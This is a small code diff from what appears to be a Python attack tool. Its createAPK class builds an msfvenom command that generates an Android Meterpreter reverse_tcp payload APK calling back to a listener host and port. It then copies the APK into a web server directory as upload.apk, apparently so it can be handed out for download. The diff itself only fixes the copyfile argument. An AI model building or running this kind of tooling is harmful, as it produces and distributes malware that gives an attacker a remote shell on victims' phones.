@@ -24,7 +24,7 @@ class createAPK:
         com = "msfvenom -p android/meterpreter/reverse_tcp LHOST="+ipl+" LPORT="+lp[0]+" R >"+app_name[0]+".apk"
         
         self.launchProcess(com)
-        copyfile(app_name, "/var/www/html/upload.apk")
+        copyfile(app_name[0], "/var/www/html/upload.apk")
         
         return ipl
         
